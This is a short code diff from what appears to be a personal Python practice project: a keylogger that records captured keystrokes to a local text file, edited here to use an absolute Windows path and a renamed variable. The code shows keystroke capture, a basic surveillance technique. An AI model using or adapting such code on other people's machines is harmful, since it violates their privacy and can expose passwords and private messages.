@@ -20,13 +20,13 @@ def press(key):
         keys = []
 
 def save(keys):
-    with open("save.txt", "a") as file:
+    with open(r"C:\Users\Flores\Joey-vscode-workspaces\Python-Practice\.projects\.completed\keylogger\save.txt", "a") as file:
         for key in keys:
-            _key = str(key).replace("'", "")
-            if _key.find("space") > 0:
+            key = str(key).replace("'", "")
+            if key.find("space") > 0:
                 file.write("\n")
             elif key.find("key") == -1:
-                file.write(_key)
+                file.write(key)
 
 def release(key):
     if key == Key.esc:
